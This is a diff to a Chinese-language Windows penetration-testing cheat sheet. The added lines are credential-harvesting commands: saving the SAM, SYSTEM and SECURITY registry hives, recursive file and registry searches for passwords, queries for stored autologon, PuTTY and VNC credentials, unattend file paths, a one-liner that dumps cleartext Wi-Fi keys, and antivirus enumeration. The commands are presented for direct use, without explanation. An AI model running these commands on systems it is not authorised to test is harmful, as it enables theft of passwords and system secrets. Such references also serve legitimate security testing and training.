@@ -25,7 +25,7 @@
 
 用户信息
 ----------------------------------------
-- 查看用户 ``net user`` / ``whoami`` / ``whoami /all``
+- 查看用户 ``net user`` / ``whoami`` / ``whoami /all`` / ``echo %USERNAME% || whoami``
 - 查看用户信息: ``net user <administrator>``
 - 用户特权信息 ``whoami /priv``
 - 查看当前权限 ``net localgroup administrators``
@@ -52,6 +52,47 @@
 ----------------------------------------
 + 当前系统凭据
 	- ``cmdkey /l``
++ REG导出SAM数据
+	::
+		
+		reg save HKLM\SAM sam.hiv
+		reg save HKLM\SYSTEM system.hiv
+		reg save HKLM\SECURITY security.hiv
++ 系统文件查找
+	- ``cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt``
+	- ``findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt``
+	- ``findstr /spin "password" *.*``
++ 文件名查找
+	- ``dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*``
+	- ``where /R C:\ user.txt``
+	- ``where /R C:\ *.ini``
++ 注册表搜索密码
+	::
+	
+		REG QUERY HKLM /F "password" /t REG_SZ /S /K
+		REG QUERY HKCU /F "password" /t REG_SZ /S /K
+
+		reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+		reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+		reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
+		reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+		reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+		reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+		reg query HKLM /f password /t REG_SZ /s
+		reg query HKCU /f password /t REG_SZ /s
++ unattend.xml
+	::
+	
+		C:\unattend.xml
+		C:\Windows\Panther\Unattend.xml
+		C:\Windows\Panther\Unattend\Unattend.xml
+		C:\Windows\system32\sysprep.inf
+		C:\Windows\system32\sysprep\sysprep.xml
++ wifi密码
+	- Find AP SSID: ``netsh wlan show profile``
+	- Get Cleartext Pass: ``netsh wlan show profile <SSID> key=clear``
+	- ``cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on``
 
 其他
 ----------------------------------------
@@ -62,6 +103,7 @@
 		+ ``wmic /?``
 		+ 查看nic命令帮助：``wmic nic /?``
 		+ 信息筛选：``wmic nic where NetConnectionStatus=2 get Name,MACAddress,NetConnectionStatus``
+	- 查看杀软：``WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName``
 	- 进程管理
 		+ 列出进程的核心信息：``wmic process list brief``
 		+ 新建进程：``wmic process call create notepad``
